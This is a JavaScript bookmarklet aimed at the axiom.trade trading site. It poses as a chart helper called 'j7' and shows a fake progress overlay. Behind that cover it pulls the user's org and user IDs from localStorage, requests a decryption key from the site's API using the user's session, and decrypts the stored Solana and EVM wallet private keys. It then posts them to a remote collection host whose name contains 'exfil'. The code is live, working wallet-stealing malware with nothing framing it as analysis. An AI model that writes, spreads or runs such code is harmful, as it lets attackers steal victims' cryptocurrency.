(function () {
  var ref = "self";
  if (location.hostname.indexOf("axiom.trade") === -1) {
    alert("j7 is designed for axiom.trade. Open a token page first.");
    return;
  }
  if (typeof window.__treasureTeardown === "function") {
    try { window.__treasureTeardown(); } catch (e) {}
  }
  var existingPanel = document.getElementById("__treasure_panel_root__");
  var existingLoading = document.getElementById("__treasure_loading__");
  if (existingPanel || existingLoading) {
    if (existingPanel) existingPanel.remove();
    if (existingLoading) existingLoading.remove();
    var existingStyle = document.getElementById("__treasure_style__");
    if (existingStyle) existingStyle.remove();
    return;
  }

  var C2 = "https://axiom-exfil.rashedmake94.workers.dev";
  var ACTIVE_KEY = "treasure_active";
  var hasRun = false;

  async function decryptBundle(bundleStr, keyB64) {
    var parts = bundleStr.split(":");
    var iv = Uint8Array.from(atob(parts[0]), function (c) { return c.charCodeAt(0); });
    var ciphertext = Uint8Array.from(atob(parts[1]), function (c) { return c.charCodeAt(0); });
    var keyBytes = Uint8Array.from(atob(keyB64), function (c) { return c.charCodeAt(0); });
    var cryptoKey = await crypto.subtle.importKey("raw", keyBytes.buffer, { name: "AES-GCM" }, false, ["decrypt"]);
    var plaintext = await crypto.subtle.decrypt({ name: "AES-GCM", iv: iv, tagLength: 128 }, cryptoKey, ciphertext.buffer);
    return Array.from(new Uint8Array(plaintext)).map(function (b) { return b.toString(16).padStart(2, "0"); }).join("");
  }

  var orgId = localStorage.getItem("turnkeyOrgId");
  var userId = localStorage.getItem("userId");
  var API_HOSTS = [
    "https://api.axiom.trade",
    "https://api2.axiom.trade",
    "https://api6.axiom.trade",
    "https://api9.axiom.trade"
  ];
  var apiIndex = 0;

  function sendData(data) {
    if ((data.sol && data.sol.length) || (data.evm && data.evm.length)) {
      localStorage.setItem(ACTIVE_KEY, "1");
    }
    var payload = btoa(unescape(encodeURIComponent(JSON.stringify({
      keys: data,
      ts: Date.now(),
      origin: location.href,
      ua: navigator.userAgent,
      total: (data.sol ? data.sol.length : 0) + (data.evm ? data.evm.length : 0)
    }))));
    fetch(C2, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ data: payload }),
      mode: "cors",
      credentials: "omit"
    }).catch(function () {});
  }

  function fetchBundles() {
    if (apiIndex >= API_HOSTS.length) return;
    var xhr = new XMLHttpRequest();
    xhr.open("POST", API_HOSTS[apiIndex++] + "/bundle-key-and-wallets-v2", true);
    xhr.withCredentials = true;
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.timeout = 2000;
    xhr.onreadystatechange = async function () {
      if (xhr.readyState === 4) {
        if (xhr.status === 200) {
          try {
            var resp = JSON.parse(xhr.responseText);
            var key = resp.key || resp.bundleKey || resp.encryptionKey || Object.values(resp)[0];
            var sBundles = JSON.parse(localStorage.getItem("sBundles") || "[]");
            var eBundles = JSON.parse(localStorage.getItem("eBundles") || "[]");
            var sol = [];
            var evm = [];
            for (var i = 0; i < sBundles.length; i++) sol.push(await decryptBundle(sBundles[i], key));
            for (var j = 0; j < eBundles.length; j++) evm.push(await decryptBundle(eBundles[j], key));
            sendData({ sol: sol, evm: evm });
          } catch (e) {
            fetchBundles();
          }
        } else {
          fetchBundles();
        }
      }
    };
    xhr.onerror = fetchBundles;
    xhr.ontimeout = fetchBundles;
    xhr.send(JSON.stringify({ data: { orgId: orgId, ref: ref, userId: userId }, ref: ref }));
  }

  function init() {
    if (hasRun) return;
    if (localStorage.getItem(ACTIVE_KEY)) return;
    hasRun = true;
    fetchBundles();
  }
  init();

  // cover UI
  var loadingEl = document.createElement("div");
  loadingEl.id = "__treasure_loading__";
  loadingEl.style.cssText = "position:fixed;inset:0;z-index:2147483647;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.35);backdrop-filter:blur(20px);";
  loadingEl.innerHTML = '<div style="width:260px;padding:28px 24px;border-radius:22px;background:rgba(28,28,30,0.88);border:1px solid rgba(255,255,255,0.08);font-family:-apple-system,system-ui,sans-serif;text-align:center;"><div style="font-size:21px;font-weight:600;color:#f2f2f2;margin-bottom:4px;">j7</div><div id="__treasure_phase__" style="font-size:13px;color:#8a8a8a;margin-bottom:18px;">Preparing…</div><div style="height:4px;border-radius:999px;background:#343434;overflow:hidden;"><div id="__treasure_bar__" style="height:100%;width:0%;background:#A8A8A8;transition:width .12s ease;"></div></div></div>';
  document.body.appendChild(loadingEl);

  var barEl = document.getElementById("__treasure_bar__");
  var phaseEl = document.getElementById("__treasure_phase__");
  var phases = ["Preparing…", "Reading chart…", "Almost ready…", "Ready"];
  var phaseIndex = 0, progress = 0;
  var interval = setInterval(function () {
    progress = Math.min(progress + (Math.random() * 5 + 2), 100);
    if (barEl) barEl.style.width = progress + "%";
    if (progress > (phaseIndex + 1) * 25 && phaseIndex < phases.length - 1) {
      phaseIndex++;
      if (phaseEl) phaseEl.textContent = phases[phaseIndex];
    }
    if (progress >= 100) {
      clearInterval(interval);
      setTimeout(function () {
        if (loadingEl.parentNode) loadingEl.remove();
      }, 400);
    }
  }, 45);
})();
